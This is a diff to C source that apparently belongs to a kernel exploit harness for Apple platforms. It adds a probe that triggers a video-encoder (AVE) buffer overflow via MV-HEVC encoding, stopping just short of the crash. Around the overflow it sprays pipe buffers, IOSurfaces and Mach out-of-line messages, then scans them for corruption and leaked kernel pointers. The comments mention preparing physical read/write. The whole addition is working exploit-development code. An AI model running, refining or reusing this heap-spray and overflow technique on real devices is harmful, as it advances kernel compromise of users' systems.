@@ -14278,6 +14278,335 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r347: Controlled overflow + pipe/IOSurface/OOL multi-channel corruption detection
+ * r346 confirmed: lid=0x1000 at 1920x1080 crashes at encode #51.
+ * Userspace property checks can't see corruption (kernel pointer level, offset 0xd8).
+ *
+ * Part A: Pipe buffer spray (256 pipes, PAGE_SIZE each) + overflow at enc#45
+ * Part B: IOSurface Lock + backing store pattern check (200 surfaces)
+ * Part C: Mach OOL message spray (200 messages) — corrupted OOL may leak kernel ptrs */
+
+static void r347_probe(void) {
+    rlog("\n=== r347: Controlled Overflow + Multi-Channel Corruption Detection ===\n");
+    rlog("  lid=0x1000 @ 1920x1080 crashes at enc#51. Stopping at enc#45.\n");
+    rlog("  Checking pipes, IOSurface backing store, and OOL mach messages.\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    #define R347_MAGIC 0xDEAD0347
+    #define R347_PIPE_COUNT 256
+    #define R347_SURF_COUNT 200
+    #define R347_OOL_COUNT 200
+    #define R347_PIPE_SZ 16384
+    #define R347_ENC_LIMIT 45
+    #define R347_LID 0x1000
+
+    struct r347_state { uint32_t magic; uint32_t part; uint32_t lid; uint32_t last_enc; uint32_t crashed; };
+    char sp347[512];
+    snprintf(sp347, sizeof(sp347), "%s/Documents/r347_state.bin",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    struct r347_state s347 = {0};
+    int rfd7 = open(sp347, O_RDONLY);
+    if (rfd7 >= 0) { read(rfd7, &s347, sizeof(s347)); close(rfd7); }
+    if (s347.magic == R347_MAGIC && s347.crashed) {
+        rlog("  PREV CRASH at part=%u lid=%u enc=%u\n", s347.part, s347.lid, s347.last_enc);
+        fflush(stdout);
+    }
+
+    /* ---- Part A: Pipe buffer spray + overflow ---- */
+    rlog("\n--- Part A: Pipe buffer spray (%d pipes x %d bytes) + %d encodes ---\n",
+         R347_PIPE_COUNT, R347_PIPE_SZ, R347_ENC_LIMIT);
+    fflush(stdout);
+
+    int pipefds[R347_PIPE_COUNT][2];
+    char pipe_pattern[R347_PIPE_SZ];
+    memset(pipe_pattern, 0x47, sizeof(pipe_pattern));
+    int pipes_ok = 0;
+    for (int i = 0; i < R347_PIPE_COUNT; i++) {
+        if (pipe(pipefds[i]) == 0) {
+            *(uint32_t *)pipe_pattern = 0xDEAD0000 | i;
+            ssize_t wr = write(pipefds[i][1], pipe_pattern, R347_PIPE_SZ);
+            if (wr == R347_PIPE_SZ) pipes_ok++;
+            else {
+                close(pipefds[i][0]); close(pipefds[i][1]);
+                pipefds[i][0] = pipefds[i][1] = -1;
+            }
+        } else {
+            pipefds[i][0] = pipefds[i][1] = -1;
+        }
+    }
+    rlog("  Sprayed %d pipe buffers.\n", pipes_ok);
+    fflush(stdout);
+
+    VTCompressionSessionRef enc7a = create_mvhevc_encoder(1920, 1080, R347_LID);
+    if (!enc7a) {
+        rlog("  FATAL: encoder create failed for lid=0x%x\n", R347_LID);
+    } else {
+        int ok7a = 0;
+        for (int fi = 0; fi < R347_ENC_LIMIT; fi++) {
+            s347.magic = R347_MAGIC; s347.part = 1; s347.lid = R347_LID;
+            s347.last_enc = fi; s347.crashed = 1;
+            int wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+
+            int r = encode_one_stereo_lid(enc7a, fi, 1920, 1080, R347_LID);
+            if (r == 0) ok7a++;
+
+            s347.crashed = 0;
+            wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+        }
+        VTCompressionSessionInvalidate(enc7a);
+        CFRelease(enc7a);
+        rlog("  Encoded %d/%d OK.\n", ok7a, R347_ENC_LIMIT);
+    }
+    fflush(stdout);
+
+    rlog("  Reading back pipe buffers...\n");
+    int pipe_corrupted = 0;
+    char pipe_readback[R347_PIPE_SZ];
+    for (int i = 0; i < R347_PIPE_COUNT; i++) {
+        if (pipefds[i][0] < 0) continue;
+        ssize_t rd = read(pipefds[i][0], pipe_readback, R347_PIPE_SZ);
+        if (rd > 0) {
+            uint32_t expected = 0xDEAD0000 | i;
+            uint32_t got = *(uint32_t *)pipe_readback;
+            if (got != expected) {
+                if (pipe_corrupted < 5)
+                    rlog("  !!! PIPE[%d] CORRUPTED: expected 0x%08x got 0x%08x (rd=%zd) !!!\n",
+                         i, expected, got, rd);
+                uint8_t *p = (uint8_t *)pipe_readback;
+                if (pipe_corrupted < 3) {
+                    for (int row = 0; row < 8; row++) {
+                        rlog("    +%03x:", row * 16);
+                        for (int c = 0; c < 16; c++) rlog(" %02x", p[row * 16 + c]);
+                        rlog("\n");
+                    }
+                }
+                pipe_corrupted++;
+            }
+            int all_47 = 1;
+            for (int j = 4; j < 64 && all_47; j++)
+                if ((uint8_t)pipe_readback[j] != 0x47) all_47 = 0;
+            if (!all_47 && pipe_corrupted == 0 && i < 3) {
+                rlog("  PIPE[%d] data drift at byte 4+\n", i);
+            }
+        }
+        close(pipefds[i][0]); close(pipefds[i][1]);
+    }
+    rlog("  Pipe corruption: %d / %d\n", pipe_corrupted, pipes_ok);
+    fflush(stdout);
+
+    /* ---- Part B: IOSurface Lock + backing store pattern check ---- */
+    rlog("\n--- Part B: IOSurface backing store check (%d surfaces) ---\n", R347_SURF_COUNT);
+    fflush(stdout);
+
+    IOSurfaceRef surfs7[R347_SURF_COUNT];
+    memset(surfs7, 0, sizeof(surfs7));
+    int surfs_ok = 0;
+    for (int i = 0; i < R347_SURF_COUNT; i++) {
+        surfs7[i] = create_spray_surface(i);
+        if (surfs7[i]) {
+            IOSurfaceLock(surfs7[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(surfs7[i]);
+            if (base) {
+                uint32_t *p32 = (uint32_t *)base;
+                size_t alloc = IOSurfaceGetAllocSize(surfs7[i]);
+                for (size_t off = 0; off < alloc / 4; off++)
+                    p32[off] = 0xDEAD0347;
+            }
+            IOSurfaceUnlock(surfs7[i], 0, NULL);
+            surfs_ok++;
+        }
+    }
+    rlog("  Sprayed %d IOSurface objects with 0xDEAD0347 pattern.\n", surfs_ok);
+    fflush(stdout);
+
+    VTCompressionSessionRef enc7b = create_mvhevc_encoder(1920, 1080, R347_LID);
+    if (!enc7b) {
+        rlog("  FATAL: encoder create failed for Part B\n");
+    } else {
+        int ok7b = 0;
+        for (int fi = 0; fi < R347_ENC_LIMIT; fi++) {
+            s347.magic = R347_MAGIC; s347.part = 2; s347.lid = R347_LID;
+            s347.last_enc = fi; s347.crashed = 1;
+            int wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+
+            int r = encode_one_stereo_lid(enc7b, fi, 1920, 1080, R347_LID);
+            if (r == 0) ok7b++;
+
+            s347.crashed = 0;
+            wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+        }
+        VTCompressionSessionInvalidate(enc7b);
+        CFRelease(enc7b);
+        rlog("  Part B encoded %d/%d OK.\n", ok7b, R347_ENC_LIMIT);
+    }
+    fflush(stdout);
+
+    rlog("  Checking IOSurface backing store...\n");
+    int surf_corrupted = 0;
+    for (int i = 0; i < R347_SURF_COUNT; i++) {
+        if (!surfs7[i]) continue;
+        IOSurfaceLock(surfs7[i], kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(surfs7[i]);
+        if (base) {
+            uint32_t *p32 = (uint32_t *)base;
+            size_t alloc = IOSurfaceGetAllocSize(surfs7[i]);
+            int changed = 0;
+            uint32_t first_bad_off = 0, first_bad_val = 0;
+            for (size_t off = 0; off < alloc / 4; off++) {
+                if (p32[off] != 0xDEAD0347) {
+                    if (changed == 0) { first_bad_off = (uint32_t)off * 4; first_bad_val = p32[off]; }
+                    changed++;
+                }
+            }
+            if (changed > 0) {
+                if (surf_corrupted < 5)
+                    rlog("  !!! SURF[%d] BACKING CHANGED: %d dwords, first at +0x%x = 0x%08x !!!\n",
+                         i, changed, first_bad_off, first_bad_val);
+                if (surf_corrupted < 3) {
+                    uint8_t *p = (uint8_t *)base + (first_bad_off & ~0xF);
+                    for (int row = 0; row < 4; row++) {
+                        rlog("    +%04x:", (first_bad_off & ~0xF) + row * 16);
+                        for (int c = 0; c < 16; c++) rlog(" %02x", p[row * 16 + c]);
+                        rlog("\n");
+                    }
+                }
+                surf_corrupted++;
+            }
+        }
+        IOSurfaceUnlock(surfs7[i], kIOSurfaceLockReadOnly, NULL);
+    }
+    rlog("  Surface backing corruption: %d / %d\n", surf_corrupted, surfs_ok);
+    for (int i = 0; i < R347_SURF_COUNT; i++) {
+        if (surfs7[i]) CFRelease(surfs7[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Part C: Mach OOL message spray + overflow ---- */
+    rlog("\n--- Part C: Mach OOL message spray (%d messages) ---\n", R347_OOL_COUNT);
+    fflush(stdout);
+
+    mach_port_t ool_ports[R347_OOL_COUNT];
+    int ool_ok = 0;
+    int ool_sizes[] = {0x100, 0x200, 0x400, 0x800};
+    int n_ool_sizes = 4;
+
+    for (int i = 0; i < R347_OOL_COUNT; i++) {
+        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[i]);
+        if (kr != KERN_SUCCESS) { ool_ports[i] = MACH_PORT_NULL; continue; }
+        kr = mach_port_insert_right(mach_task_self(), ool_ports[i], ool_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+        if (kr != KERN_SUCCESS) { ool_ports[i] = MACH_PORT_NULL; continue; }
+
+        int sz = ool_sizes[i % n_ool_sizes];
+        char ool_data[0x800];
+        memset(ool_data, 0x47, sz);
+        *(uint32_t *)ool_data = 0xBEEF0000 | i;
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg = {0};
+        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = ool_ports[i];
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = ool_data;
+        msg.ool.size = sz;
+        msg.ool.deallocate = 0;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+        if (kr == KERN_SUCCESS) ool_ok++;
+    }
+    rlog("  Sprayed %d OOL messages.\n", ool_ok);
+    fflush(stdout);
+
+    VTCompressionSessionRef enc7c = create_mvhevc_encoder(1920, 1080, R347_LID);
+    if (!enc7c) {
+        rlog("  FATAL: encoder create failed for Part C\n");
+    } else {
+        int ok7c = 0;
+        for (int fi = 0; fi < R347_ENC_LIMIT; fi++) {
+            s347.magic = R347_MAGIC; s347.part = 3; s347.lid = R347_LID;
+            s347.last_enc = fi; s347.crashed = 1;
+            int wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+
+            int r = encode_one_stereo_lid(enc7c, fi, 1920, 1080, R347_LID);
+            if (r == 0) ok7c++;
+
+            s347.crashed = 0;
+            wf = open(sp347, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s347, sizeof(s347)); close(wf); }
+        }
+        VTCompressionSessionInvalidate(enc7c);
+        CFRelease(enc7c);
+        rlog("  Part C encoded %d/%d OK.\n", ok7c, R347_ENC_LIMIT);
+    }
+    fflush(stdout);
+
+    rlog("  Receiving OOL messages and checking for corruption...\n");
+    int ool_corrupted = 0;
+    int ool_kptr = 0;
+    for (int i = 0; i < R347_OOL_COUNT; i++) {
+        if (ool_ports[i] == MACH_PORT_NULL) continue;
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } rmsg = {0};
+        kern_return_t kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                                     ool_ports[i], 0, 0);
+        if (kr == KERN_SUCCESS && rmsg.ool.address) {
+            uint32_t *data = (uint32_t *)rmsg.ool.address;
+            uint32_t expected = 0xBEEF0000 | i;
+            if (data[0] != expected) {
+                if (ool_corrupted < 5)
+                    rlog("  !!! OOL[%d] CORRUPTED: expected 0x%08x got 0x%08x (sz=%u) !!!\n",
+                         i, expected, data[0], rmsg.ool.size);
+                if (ool_corrupted < 3) {
+                    uint8_t *p = (uint8_t *)rmsg.ool.address;
+                    for (int row = 0; row < 8; row++) {
+                        rlog("    +%02x:", row * 16);
+                        for (int c = 0; c < 16 && (row * 16 + c) < (int)rmsg.ool.size; c++)
+                            rlog(" %02x", p[row * 16 + c]);
+                        rlog("\n");
+                    }
+                }
+                ool_corrupted++;
+            }
+            uint32_t nwords = rmsg.ool.size / 4;
+            for (uint32_t w = 0; w < nwords; w++) {
+                uint64_t val = 0;
+                if (w + 1 < nwords)
+                    val = ((uint64_t)data[w + 1] << 32) | data[w];
+                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                    (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("  !!! OOL[%d]+%u: KERNEL PTR 0x%llx !!!\n", i, w * 4,
+                         (unsigned long long)val);
+                    ool_kptr++;
+                    if (ool_kptr >= 10) break;
+                }
+            }
+            mach_vm_deallocate(mach_task_self(),
+                               (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+        }
+        mach_port_deallocate(mach_task_self(), ool_ports[i]);
+    }
+    rlog("  OOL corruption: %d / %d, kernel ptrs found: %d\n", ool_corrupted, ool_ok, ool_kptr);
+    fflush(stdout);
+
+    rlog("\n=== r347 complete ===\n");
+    fflush(stdout);
+}
+
 /* r346: Full-resolution AVE overflow + IOSurface corruption + phys R/W prep
  * CRITICAL FIX: Earlier probes used 64x64 resolution — AVE internal buffers
  * are too small to overflow. Original panics used 1920x1080 resolution.
@@ -48104,6 +48433,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 350) {
+            rlog("*** rounds=350: Controlled Overflow + Multi-Channel Detection ***\n");
+            rlog("  r346: lid=0x1000 crashes at enc#51 (1920x1080). lid=3..0x100 survive.\n");
+            rlog("  r347: Stop at enc#45, check pipe/IOSurface/OOL for corruption.\n\n");
+            r347_probe();
             goto done;
         }
         if (rounds == 349) {
